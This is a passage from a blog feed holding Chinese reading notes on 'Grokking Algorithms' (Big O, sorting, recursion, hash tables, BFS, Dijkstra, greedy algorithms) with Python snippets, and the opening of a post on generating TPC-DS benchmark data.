常量时间，哈希</span><br><span class="line">O(log2(n)):       对数时间，二分，</span><br><span class="line">O(n):             线性时间，简单</span><br><span class="line">O(nlog2(n)):              快速排序</span><br><span class="line">O(n2):                    选择排序（冒泡）</span><br><span class="line">O(n!):                    旅行商问题</span><br></pre></td></tr></table></figure><p>算法的速度指的并非时间，而是操作数的增速。</p><p>谈论算法的速度时，我们说的是随着输入的增加，其运行时间将以什么样的速度增加。</p><p>算法的运行时间用大O表示法表示。</p><p>O(log n)比O(n)快，当需要搜索的元素越多时，前者比后者快得越多。</p><h4 id="旅行商问题"><a href="#旅行商问题" class="headerlink" title="旅行商问题"></a>旅行商问题</h4><p>行商问题（最短路径问题）（英语：travelling salesman problem, TSP）是这样一个问题：给定一系列城市和每对城市之间的距离，求解访问每一座城市一次并回到起始城市的最短回路。它是组合优化中的一个NP困难问题，在运筹学和理论计算机科学中非常重要。</p><hr><h2 id="第二章-选择排序"><a href="#第二章-选择排序" class="headerlink" title="第二章 选择排序"></a>第二章 选择排序</h2><h3 id="2-1-内存工作原理"><a href="#2-1-内存工作原理" class="headerlink" title="2.1 内存工作原理"></a>2.1 内存工作原理</h3><h3 id="2-2-数组和链表"><a href="#2-2-数组和链表" class="headerlink" title="2.2 数组和链表"></a>2.2 数组和链表</h3><p><strong>链表</strong>：不需要移动元素，优势在插入元素</p><p>使用链表在中间插入元素只需要修改前面一个元素指向的地址，因此当需要在中间插入的时候，链表是更好的选择。</p><p>删除也是一样</p><p>数组和链表的运行时间：</p><table><thead><tr><th></th><th>数组</th><th>链表</th></tr></thead><tbody><tr><td>读取</td><td>O(1)</td><td>O(n)</td></tr><tr><td>插入</td><td>O(n)</td><td>O(1)</td></tr><tr><td>删除</td><td>O(n)</td><td>O(1)</td></tr></tbody></table><p>有两种访问方式：随机访问和顺序访问。</p><p>顺序访问意味着从第一个元素开始逐个读取元素，链表只能顺序访问，数组支持随机访问，所以数组在需要随机访问的情况下用得很多。</p><h3 id="2-3-选择排序"><a href="#2-3-选择排序" class="headerlink" title="2.3 选择排序"></a>2.3 选择排序</h3><p>时间复杂度的Tips</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g39qnoufddj20oz08a0v8.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSmallest</span><span class="params">(arr)</span>:</span></span><br><span class="line">    smallest = arr[<span class="number">0</span>]</span><br><span class="line">    smallest_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i] &lt; smallest:</span><br><span class="line">            smallest = arr[i]</span><br><span class="line">            smallest_index = i</span><br><span class="line">    <span class="keyword">return</span> smallest_index</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection</span><span class="params">(arr)</span>:</span></span><br><span class="line">    newArr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        smallest = findSmallest(arr)</span><br><span class="line">        newArr.append(arr.pop(smallest))</span><br><span class="line">    <span class="keyword">return</span> newArr</span><br><span class="line"></span><br><span class="line">print(selection( [<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">10</span>] ))</span><br></pre></td></tr></table></figure><p>Tips：</p><p>python之间的语法不兼容是很蛋疼的事情</p><p>py2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"Pyhon 2 can use print string without ()"</span>;</span><br></pre></td></tr></table></figure><p>py3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Python3, print must use () to output string"</span>);</span><br></pre></td></tr></table></figure><p>py3中，print作为函数必须要带括号</p><h2 id="第三章-递归"><a href="#第三章-递归" class="headerlink" title="第三章 递归"></a>第三章 递归</h2><p>递归：优雅的问题解决办法</p><h3 id="3-1-递归"><a href="#3-1-递归" class="headerlink" title="3.1 递归"></a>3.1 递归</h3><p>“如果使用循环，程序的性能可能更高；如果使用递归，程序可能 更容易理解。如何选择要看什么对你来说更重要“</p><h3 id="3-2-基线条件和递归条件"><a href="#3-2-基线条件和递归条件" class="headerlink" title="3.2 基线条件和递归条件"></a>3.2 基线条件和递归条件</h3><p>递归条件(base case)是指函数调用自己，基线条件(recursive case)是指函数不再调用自己，从而表面形成无限循环。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        countdown(i<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">countdown(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="3-3-栈"><a href="#3-3-栈" class="headerlink" title="3.3 栈"></a>3.3 栈</h3><p>调用栈（call stack）</p><p>python虽然不是用的JVM 但是 对于栈内存的调用 好像都差不多</p><p>递归函数factorial(5)写作5!</p><p>意义是5! = 5 <em> 4 </em> 3 <em> 2 </em> 1</p><p>使用栈虽然很方便但是也要付出代价：占用大量内存</p><h2 id="第四章-快速排序"><a href="#第四章-快速排序" class="headerlink" title="第四章 快速排序"></a>第四章 快速排序</h2><h3 id="4-1-分而治之"><a href="#4-1-分而治之" class="headerlink" title="4.1 分而治之"></a>4.1 分而治之</h3><p>一种著名的递归式问题解决方法—divide and conquer,D&amp;C</p><p>重要的D&amp;C是算法：快排，优雅代码的典范</p><p>欧几里得算法(辗转相除法)：gcd(a.b) = gcd(b, a%b)</p><table><thead><tr><th>大的那个数</th><th>小的那个数</th><th>余数</th><th>商</th></tr></thead><tbody><tr><td>a</td><td>b</td><td>r0 = a%b</td><td>q0</td></tr><tr><td>b</td><td>r0</td><td>r1 = b% r0</td><td>q1</td></tr><tr><td>r0</td><td>r1</td><td>r2 = r0 % r1</td><td>q2</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>rN-4</td><td>rN-3</td><td>rN-2 = rN-4 % rN-3</td><td>qN-2</td></tr><tr><td>rN-3</td><td>rN-2</td><td>rN-1 = rN-3 % rN-2</td><td>qN-1</td></tr><tr><td>rN-2</td><td>rN-1</td><td>rN = rN-2 % rN-1</td><td>qN</td></tr><tr><td>rN-1</td><td>rN == 0</td><td>rN-1 = 1 <em> rN-1 - 0 </em> rN</td><td>0</td></tr></tbody></table><p>得到的最大公约数就是rN-1</p><p>欧几里得算法的证明：</p><p>我个人觉得反证法比较好理解：</p><p> 要证欧几里德算法成立，即证: gcd(a,b)=gcd(b,r),其中 gcd是取最大公约数的意思，r=a mod b<br>    下面证 gcd（a，b）=gcd（b，r）<br>    设  c是a，b的最大公约数，即c=gcd（a，b），则有 a=mc，b=nc，其中m，n为正整数，且m，n互为质数<br>    由 r= a mod b可知，r= a- qb 其中，q是正整数，<br>    则 r=a-qb=mc-qnc=（m-qn）c<br>    b=nc,r=(m-qn)c，且n，（m-qn）互质（假设n，m-qn不互质，则n=xd, m-qn=yd 其中x,y,d都是正整数，且d&gt;1</p><p>​    则a=mc=(qx+y)dc, b=xdc,这时a,b 的最大公约数变成dc，与前提矛盾，所以n ，m-qn一定互质）<br>​    则gcd（b,r）=c=gcd（a,b）<br>​    得证。</p><p>编写涉及数组的递归函数时，基线条件通常是数组为空或只包含一个元素。陷入困境时， 请检查基线条件是不是这样的。 </p><h3 id="4-2-快排"><a href="#4-2-快排" class="headerlink" title="4.2 快排"></a>4.2 快排</h3><p>快排使用了D&amp;C</p><p>思路：</p><p>基线条件：数组为空或者只包含一个元素。这种情况下，只需要原样返回。</p><p>对于两个元素的数组：如果第一个元素比第二个元素小，直接返回，如果不是，就交换位置。</p><p>三个元素的数组：</p><p>从数组中选择一个元素，这个元素被称为基准值(pivot)，</p><p>我们暂时先将数组的第一个元素作为基准值。</p><p>接下来找出比基准值小的元素以及比他大的元素。这个过程被称为分区（partition）</p><p>这里两个分区出来的数组时无需的，但是如果这两个数组是有序的，对整个数组进行排序将非常容易。</p><p>那么问题就转化成了如何对子数组进行排序，</p><p>这里我们讨论的是特定情况（三个元素），无论选用哪个元素作为pivot，剩下的情况总能用上面两个元素数组的排序方法代入。</p><p>于是就得到了解决办法</p><p>接下来四个元素的情况，类似的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quicksort</span><span class="params">(array)</span>:</span></span><br><span class="line">    <span class="comment"># 基线条件</span></span><br><span class="line">    <span class="keyword">if</span> len(array) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> array</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 递归条件</span></span><br><span class="line">        pivot = array[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 分为两个数组</span></span><br><span class="line">        less = [ i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &lt;= pivot]</span><br><span class="line">        greater = [i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &gt; pivot]</span><br><span class="line">        <span class="keyword">return</span> quicksort(less) + [pivot] + quicksort(greater)</span><br><span class="line"></span><br><span class="line">print(quicksort([<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">45645</span>,<span class="number">34</span>,<span class="number">23</span>,<span class="number">65</span>,<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>这边可以对比一下时间复杂度</p><p>选择排序的时间复杂度是O(n<sup>2</sup>)</p><p>快速排序的时间复杂度最差是O(n<sup>2</sup>)，平均情况是O(n log n)</p><p>还有一种合并排序(merge sort)运行时间是O(n log n)</p><p>现在做出一个有趣的假设，假设简单查找每次需要10ms，二分查找的常量是1s，现在我们假设查找的元素个数是10个，简单查找需要100ms，二分查找却需要log 10 * 1s，可以二分查找的时间远大于简单查找，但是我们查找的元素很大时，比如40亿，这个时候我们使用简单查找需要463天，但是二分查找只要32s。</p><p>通过这个例子，我们可以看到常量的影响可能会很大。</p><p>我们再来看快排，快排的效率取决于选择的pivot，当pivot是最小值的时候，我们其实只用到的一个数组，要递归很多次才能递归结束，这种情况是最坏的情况</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3c25jnmi2j20jx0ga0v4.jpg" alt></p><p>如果我们选择的是中间值，是最佳情况，这种情况下根本不要这么多递归，因此调用栈就短得多。</p><p>需要注意的是，我们并不是如图这么简单的+n次调用，作为递归二次每次调用栈都设计O(n)，这是递归的性质决定的。</p><p>因此，实际上最佳情况是O(n log n)</p><p>最佳情况也是平均情况（和最佳情况在同一数量级所以忽略掉前面的参数，剩下的相同），快排是D&amp;G的典范。</p><h2 id="第五章-散列表-Hash-Table"><a href="#第五章-散列表-Hash-Table" class="headerlink" title="第五章 散列表 Hash Table"></a>第五章 散列表 Hash Table</h2><blockquote><p>散列表是足有用的基本数据结构之一。</p></blockquote><p>虽然二分法的效率已经可以了，但是能不能有一种查找方法的查找时间是O(1)呢——任意给出一个查找内容，都能立即给出答案。</p><h3 id="5-1-散列函数"><a href="#5-1-散列函数" class="headerlink" title="5.1 散列函数"></a>5.1 散列函数</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3eicbpqf2j20ar07y3z4.jpg" alt></p><p>散列函数应该满足的要求：</p><ul><li>他必须是一致的。例如：假设你输入apple时得到的是4，那么每次输入apple的时候，得到的都必须是4，如果不是这样，散列表将毫无用处。</li><li>它应该将不同的输入映射到不同的数字，如果一个散列函数不管输入是什么都返回1就不可以。最理想的情况是，将不同的输入映射到不同的数字。</li></ul><p>原理：</p><ul><li>散列函数总是将同样的输入映射到相同的索引。</li><li>不同输入映射到不同的索引。</li><li>散列函数知道数组有多大。</li></ul><p>散列表是一种包含额外逻辑的数据结构。</p><p>散列表又被称为散列映射、映射、字典和关联数组。（Hash Table）</p><p>python提供的散列表实现为字典，可以使用<code>dictt</code>来创建散列表。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3ej8m95ydj20hm09omx2.jpg" alt></p><p>python语法中</p><p><code>book = dict()</code>和<code>book = {}</code>等价。</p><h3 id="5-2-应用案例"><a href="#5-2-应用案例" class="headerlink" title="5.2 应用案例"></a>5.2 应用案例</h3><p>电话簿</p><p>DNS解析（域名关联IP）DNS resolution</p><p>防止重复（比如抽奖、投票）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3ejoaiscwj20gr0743yd.jpg" alt></p><p>将案列表用作缓存</p><p>Facebook将主页、about页面，Contact页面、Terms 和 Conditions页面等众多页面通过页面URL映射到页面数据。</p><h3 id="5-3-冲突-collision"><a href="#5-3-冲突-collision" class="headerlink" title="5.3 冲突 collision"></a>5.3 冲突 collision</h3><p>大多数语言都提供了散列实现，冲突是指，两个键分配的数组位置相同，这是个问题。</p><p>解决办法：如果两个键映射到了同一个位置，就在这个位置存储一个链表。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fi55lqjgj20l606i74w.jpg" alt></p><p>但是，如果A开头的物品过多，散列表的效率将激素下降，然而：如果散列函数用的很好，这些列表就不会很长。</p><h3 id="5-4-性能"><a href="#5-4-性能" class="headerlink" title="5.4 性能"></a>5.4 性能</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fi9iv10gj20d0071my4.jpg" alt></p><p>平均情况下，散列表的查找速度和数组一样快，而插入和删除速度与链表一样快，因此它兼具两者的优点！但是最糟的情况下，散列表的各种操作都很慢。</p><p>因此，为了避免冲突，需要有：</p><p>较低的填装因子。</p><p>良好的散列函数。</p><p>装填因子：</p><p>散列表包含的元素数目/位置总数</p><p>假设再散列表中存储100种商品的价格，散列表包含100个位置名最佳情况下，每个商品都将有自己的位置。</p><p>装填因子在大于1的情况下，需要在散列表中添加位置，这个操作被称为<strong>调整长度(resizing)</strong>。</p><p>一般操作是：<strong>数组增加一倍</strong>。</p><p>接下来，将所有元素用hash函数插入到新的散列表中。</p><p>平均而言，即便考虑到调整长度所需的时间，散列表操作所需的 时间也为O(1)。 </p><p>良好的散列函数让数组中的值呈均匀分布。 </p><p>糟糕的散列函数让值扎堆，导致大量的冲突。 </p><h2 id="第六章-广度优先搜索"><a href="#第六章-广度优先搜索" class="headerlink" title="第六章 广度优先搜索"></a>第六章 广度优先搜索</h2><blockquote><p>图算法之<em>广度优先搜索</em> (breadth-first search)</p></blockquote><h3 id="6-1-图简介"><a href="#6-1-图简介" class="headerlink" title="6.1 图简介"></a>6.1 图简介</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3finx3k1jj20jb07yq40.jpg" alt></p><p>如图用来解决从A点到B点最短路径问题的办法叫图计算方法。</p><p>这种最短路径既可能是最短路径，也有可能是国际象棋中将对方将死的最少步数。</p><p>解决最短路径问题的算法被称为<strong>广度优先搜索</strong>。</p><h3 id="6-2-图是什么"><a href="#6-2-图是什么" class="headerlink" title="6.2 图是什么"></a>6.2 图是什么</h3><p>图用于模拟不同的东西是如何相连的。</p><h3 id="6-3-广度优先搜索"><a href="#6-3-广度优先搜索" class="headerlink" title="6.3 广度优先搜索"></a>6.3 广度优先搜索</h3><p>书中的例计较简单，在朋友圈中找A，先遍历朋友，查找是否有A，有的话结束，没有的话，依次遍历朋友的朋友。（和之前找芒果经销商是一样的）</p><p>能够实现这种目的的数据结构叫做<strong>队列（queue）</strong></p><p>队列的工作原理：你不能随机访问队列中的元素。队列只支持两种操作：入队和出队。</p><p>队列是一种<strong>先进先出（First In First Out，FIFO）</strong>的数据结构，而栈是一种<strong>后进先出（Last In First Out，LIFO）</strong>的数据结构。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj0qapdpj20cd04ddg7.jpg" alt></p><h3 id="6-4-实现图"><a href="#6-4-实现图" class="headerlink" title="6.4 实现图"></a>6.4 实现图</h3><p>python实现一个简单的图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj7iusshj20f70azab9.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;&#125; </span><br><span class="line">graph[<span class="string">"you"</span>] = [<span class="string">"alice"</span>, <span class="string">"bob"</span>, <span class="string">"claire"</span>] </span><br><span class="line">graph[<span class="string">"bob"</span>] = [<span class="string">"anuj"</span>, <span class="string">"peggy"</span>] </span><br><span class="line">graph[<span class="string">"alice"</span>] = [<span class="string">"peggy"</span>] </span><br><span class="line">graph[<span class="string">"claire"</span>] = [<span class="string">"thom"</span>, <span class="string">"jonny"</span>] </span><br><span class="line">graph[<span class="string">"anuj"</span>] = [] </span><br><span class="line">graph[<span class="string">"peggy"</span>] = [] </span><br><span class="line">graph[<span class="string">"thom"</span>] = [] </span><br><span class="line">graph[<span class="string">"jonny"</span>] = []</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj9dzn13j20mt04pwf5.jpg" alt></p><p>上图中的有向图和无向图是等价的。</p><h3 id="6-5-实现算法"><a href="#6-5-实现算法" class="headerlink" title="6.5 实现算法"></a>6.5 实现算法</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fjb7w4rwj20jv0ls77b.jpg" alt></p><p>在Python中，可以使用函数deque来创建一个双端队列</p><p>这边需要考虑一个情况：就是朋友是朋友的朋友，循环调用会造成无限循环。</p><p>所以需要添加容错判断。用一个列表来记录检查过的人。</p><p>图的特殊情况：指针只往一个方向，比如说：族谱。</p><h2 id="第七章-狄克斯特拉算法-Dijkstra’s-Algorithm"><a href="#第七章-狄克斯特拉算法-Dijkstra’s-Algorithm" class="headerlink" title="第七章 狄克斯特拉算法 Dijkstra’s Algorithm"></a>第七章 狄克斯特拉算法 Dijkstra’s Algorithm</h2><h3 id="7-1-狄克斯特拉算法介绍"><a href="#7-1-狄克斯特拉算法介绍" class="headerlink" title="7.1 狄克斯特拉算法介绍"></a>7.1 狄克斯特拉算法介绍</h3><p>依旧图的讨论。</p><p>如果之前的路径有了权重（节点到节点之间花费的时间不等价），重新计算最短路径，就应该使用狄克斯特拉算法。</p><p>狄克斯特拉算法包含四个步骤：</p><ul><li>找出最便宜的节点，即可在最短时间内前往的节点。</li><li>对于该节点的邻居，检查是否有前往他们的最短路径，如果有，就更新其开销。</li><li>重复这个过程，知道对图中的每个节点都这样做了。</li><li>计算最终路径。</li></ul><h3 id="7-3-术语"><a href="#7-3-术语" class="headerlink" title="7.3 术语"></a>7.3 术语</h3><p>每条边关联的数字叫做权重（weight）。</p><p>带权重的图称为加权图（weighted graph），不带权重的图称为非加权图（unweighted graph）。</p><p>要计算非加权图中的最短路径，可以使用<strong>广度优先搜索</strong>。</p><p>如果是为了计算加权图中的最短路径，可以使用<strong>迪克斯特拉算法</strong>。</p><p>图还可能有环，这意味着你可以从一个节点出发，走一圈后又回到这个节点</p><p>在无向图中，每条边都是一个环，狄克斯特拉算法只使用于有向无环图（DAG）</p><h3 id="7-4-负权边"><a href="#7-4-负权边" class="headerlink" title="7.4 负权边"></a>7.4 负权边</h3><p>如果有负权边就不能用，就不能使用狄克斯特拉算法，因为负权边，就不能使用狄克斯特拉算法。</p><p>因为负权边会导致这种算法不管用。</p><p>因为：根据狄克斯特拉算法，没有比不支付任何费用获得海报更便宜的方式。</p><p>因此：不能将狄克斯特拉算法用于包含负权边的图。</p><p>要在包含负权边的图中，找出最短路径，可以使用另一种算法： 贝尔曼—福德算法（Bellman-Ford algorithm）.</p><h3 id="7-5-实现"><a href="#7-5-实现" class="headerlink" title="7.5 实现"></a>7.5 实现</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gntz3sx0j20aa06fq38.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gobfcl77j20fz0i4wek.jpg" alt></p><p>可以用以上代码表示上图的散列表。</p><p>上面代码表达的表：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3goeygswbj20b00a6dgw.jpg" alt></p><p>接下来需要一个散列表来粗春<strong>每个节点的开销</strong>。</p><p>节点的开销：从起点出发前往该节点需要的时间。</p><p>用表表示的话如图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gofc9opgj205805zdg6.jpg" alt></p><p>表中的无穷大可以这么表示：</p><p><a href="https://www.cnblogs.com/lvye-song/p/4029691.html" target="_blank" rel="noopener">python正负无穷</a></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3goiypuf7j20e205z0sk.jpg" alt></p><p>除了上面两张表，还需要一个存储父节点的散列表：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gox0oz11j209g096wf7.jpg" alt></p><p>创建这个散列表的代码如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gozpliz7j20aj05mjr7.jpg" alt></p><p>最后，需要一个数组用于记录处理过的节点，因为对于同一个节点，你不用处理多次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processd = &#123;&#125;</span><br></pre></td></tr></table></figure><p>动图表示整个认证过程：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3hv4x3xeqg207v066jrc.gif" alt></p><p>整体过程：</p><p>本书介绍的python 迪克斯特拉算法：</p><p>使用了三个散列表和一个数组，三个散列表的作用分别是：</p><p>第一个：Graph散列表</p><p>用来记录每个节点到指向节点的权重</p><p>第二个：Costs散列表</p><p>指的起点到某个节点的消耗</p><p>第三个：Parents散列表</p><p>指的是父节点的散列表</p><p>数组的作用是记录用于处理过的节点。</p><p>处理过程是，</p><p>找出一个未处理的节点（规则定位开销最小的）</p><p>然后在表一获得该节点的开销和邻居。</p><p>遍历邻居，</p><p>接着计算从起点到X再到邻居节点的距离，然后在表一中对比这样的开销和原先的开销大小，如果这样效率更高，那么在表二中替换掉（或者更新掉原先的数字），然后在表三中改变其父节点为X</p><p>（表二记载的开销是经过父节点的最短开销）</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">node = find_lowest_cost_node(costs)</span><br><span class="line"><span class="keyword">while</span> node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">cost = costs[node]</span><br><span class="line">neighbors = graph[node]</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> neighbors.keys():</span><br><span class="line">new_cost = cost + neighbors[n]</span><br><span class="line"><span class="keyword">if</span> costs[n] &gt; new_cost:</span><br><span class="line">costs[n] = new_cost</span><br><span class="line">parents[n] = node</span><br><span class="line">processed.append(node)</span><br><span class="line">node = find_lowest_cost_node(costs)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_lowest_cost_node</span><span class="params">(costs)</span>:</span></span><br><span class="line">    lowest_cost = float(<span class="string">"inf"</span>)</span><br><span class="line">    lowest_cost_node = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> costs:</span><br><span class="line">        cost = costs[node]</span><br><span class="line">        <span class="keyword">if</span> cost &lt; lowest_cost <span class="keyword">and</span> node <span class="keyword">not</span> <span class="keyword">in</span> processed:</span><br><span class="line">        lowest_cost = cost</span><br><span class="line">            lowest_cost_node = node</span><br><span class="line"><span class="keyword">return</span> lowest_cost_node</span><br></pre></td></tr></table></figure><p>书上对这个过程的描述还可以，但是我觉得如果能增加一个循环就更好了。</p><h2 id="第八章-贪婪算法"><a href="#第八章-贪婪算法" class="headerlink" title="第八章 贪婪算法"></a>第八章 贪婪算法</h2><h3 id="8-1-教室调度问题"><a href="#8-1-教室调度问题" class="headerlink" title="8.1 教室调度问题"></a>8.1 教室调度问题</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3iys53c86j20m50b140f.jpg" alt></p><p>解决方法：</p><p>(1) 选出结束最早的课，它就是要在这间教室上的第一堂课。 </p><p>(2) 接下来，必须选择第一堂课结束后才开始的课。同样，你选择结束最早的课，这将是要 在这间教室上的第二堂课。 </p><p>重读这样做就能找出答案。</p><p>即：每步都选择局部最优解，最终得到的就是全局最优解。</p><p>此方法并非万能！但是行之有效，并且<strong>简单</strong>！</p><h3 id="8-2-背包问题"><a href="#8-2-背包问题" class="headerlink" title="8.2 背包问题"></a>8.2 背包问题</h3>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;对算法的了解一直很肤浅（听学数学的朋友说算法在数学中也叫数论？），本书阅读不求快，本就是入门读物，希望能尽量理解，争取早日拿下。&lt;/p&gt;
&lt;p&gt;这边值得一提的是作者推荐了一个网站，可汗学院，&lt;code&gt;khanacademy.org&lt;/code&gt;  mark一下。&lt;/p&gt;
&lt;p&gt;看完40%来总结一下，非常好，文盲也能看懂的算法入门。&lt;/p&gt;
&lt;p&gt;这本书看完应该会扫一眼结城浩的《图解密码学》&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Grokking Algorithms" scheme="http://yoursite.com/categories/Reading-notes/Grokking-Algorithms/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Grokking Algorithms" scheme="http://yoursite.com/tags/Grokking-Algorithms/"/>
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="欧几里得算法" scheme="http://yoursite.com/tags/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    
      <category term="快排" scheme="http://yoursite.com/tags/%E5%BF%AB%E6%8E%92/"/>
    
  </entry>
  
  <entry>
    <title>Analog Data With TPCDS &amp; TPCH</title>
    <link href="http://yoursite.com/2019/05/26/analog_data/"/>
    <id>http://yoursite.com/2019/05/26/analog_data/</id>
    <published>2019-05-25T23:31:24.625Z</published>
    <updated>2019-05-25T19:11:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>为了测试Kudu的性能，学习了一下大公司SRE生成模拟数据的手段<br>本文会贴上各种原帖，本文仅记录生成过程中遇到的困难和介绍文章中的不同</p></blockquote><a id="more"></a> <h3 id="大神fayson的日志："><a href="#大神fayson的日志：" class="headerlink" title="大神fayson的日志："></a>大神<code>fayson</code>的日志：</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247488108&amp;idx=1&amp;sn=8f34c674bc12990d61a8f4de4ca3c728&amp;chksm=ec2ac265db5d4b731b93c4b7da0b3a24f0bf200274dd763531873bb4dd205e37d704ea2719b6&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">如何编译及使用TPC-DS生成测试数据</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247488190&amp;idx=1&amp;sn=3f34824bdadbfa0823823121f86cafd4&amp;chksm=ec2ac2b7db5d4ba1484d6a6cf3161fdb90798d2605d2e79fa8bf633d32766c42cc8e2b41e206&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">如何编译及使用hive-testbench生成Hive基准测试数据</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247489095&amp;idx=1&amp;sn=5af481742664f79146c58f425c9429d3&amp;chksm=ec2ac64edb5d4f58860db96ae4b452fda70b108527e4cc78c1978461ed62e67fcf997631d270&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Impala TPC-DS基准测试</a></p><h3 id="一、遇到的问题"><a href="#一、遇到的问题" class="headerlink" 